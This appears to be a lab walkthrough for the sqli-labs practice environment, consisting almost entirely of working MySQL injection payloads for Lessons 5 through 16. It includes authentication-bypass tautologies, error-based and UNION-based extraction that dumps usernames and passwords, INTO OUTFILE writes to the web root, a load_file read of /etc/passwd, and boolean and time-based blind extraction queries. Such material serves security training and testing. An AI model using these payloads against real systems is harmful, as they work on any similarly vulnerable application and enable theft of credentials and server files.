### Basic injection: 5 and 5


### Lesson 5
```	
?id=' or 1=1--+
?id=' or '1'='1
?id=' or 1=1%23
```	

### Lesson 6

```	
?id=1" or 1=1--+
?id=1" or "1"="1
?id=1" or 1=1%23


For example, to get the database name: ?id=1' and (select 1 from (select count(*),concat(database(),floor(rand()*2))a from information_schema.tables group by a)b)--+
```	

### Lesson 7

```	
?id=1')) UNION SELECT(select database()),2,3 into outfile "/var/www/html/sqli/Less-7/1.txt";--+ Content of 1.txt: 

Get all table names of 'security':

?id=1')) UNION SELECT (select group_concat(table_name) from information_schema.tables where table_schema='security'),2,3 into outfile "/var/www/html/sqli/Less-7/2.txt";--+

Get all columns of table 'users':

?id=1')) UNION SELECT (select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),2,3 into outfile "/var/www/html/sqli/Less-7/3.txt";--+

Get all username&password pairs:
?id=1')) UNION SELECT id, username, password from users into outfile "/var/www/html/sqli/Less-7/4.txt";--+

Also can load_file("/etc/passwd") to dump the passwd file:

?id=1')) union select load_file("/etc/passwd"),2,3 into outfile "/var/www/html/sqli/Less-7/5.txt";--+


```	

###  Lesson-8 (Blind SQLi+)


```	
?id=1' and (select substr(version(),1,1))<6--+
?id=1' and (select substr(version(),1,1))<5--+
?id=1' and (select substr(version(),1,1))=5--+

Get the database name

?id=1' AND (ascii(substr(database(),1,1))>ascii('a'))--+ returns true.
?id=1' AND (ascii(substr(database(),1,1))>ascii('x'))--+ returns false.
?id=1' AND (ascii(substr(database(),1,1))<ascii('m'))--+ returns false.
?id=1' AND (ascii(substr(database(),1,1))=ascii('s'))--+ returs true. So the first character is 

Get the table name
?id=1' AND (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='security'),1,1))=ascii('e'))--+
?id=1' AND (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))=ascii('e'))--+
?id=1' AND (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=ascii('e'))--+

Get columns

?id=1' AND (ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),1,1))=ascii('i'))--+

?id=1' AND (ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1),1,1))=ascii('i'))--+

```	

### Lesson-9 ( Time-based SQLi)

```	
Basic query to detect sqli+

?id=1' and sleep(10)--+

Get version

?id=1' and if(substr(version(),1,1)=5, sleep(10),null)--+

Get database

?id=1' and if(substr(database(),1,1)='s', sleep(10),null)--+

```	

### Lesson-10

```	
Similar to Lesson-9, but use double quote instead of single quote.

?id=1" and sleep(10)--++

?id=1" and if(substr(version(),1,1)=5, sleep(10),null)--+
?id=1" and if(substr(database(),1,1)='s', sleep(10),null)--+


```	
### Lesson 13 And  14


```
Get database version

username: ') union select count(*),concat( floor(rand(0)*2), 0x5e5e5e, version(), 0x5e5e5e) x from information_schema.character_sets group by x#


username: ') union select count(*),concat((select database()),floor(rand()*2))a from information_schema.tables group by a#

username: ') union select count(*), concat((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1),floor(rand()*2)) as a from information_schema.tables group by a;

```

###  Lesson 15 And 16

```
# Blind-boolian/time-based SQLi (Use '>','<', and "=" to construct boolian condition.)

1' or if ((select substr((select version()),1,1))=5,sleep(2),null)#
username:1' or if((select ascii(substr((select database()),1,1)))=ascii('s'), sleep(2), null);#
username: 1' or if((select ascii(substr((select table_name from information_schema.tables where table_schema=database()limit 0,1),1,1)))=ascii('e'),sleep(2),null)#

username: ' or if((select ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1),1,1))=ascii('i')),sleep(2),null);#


```



```


```
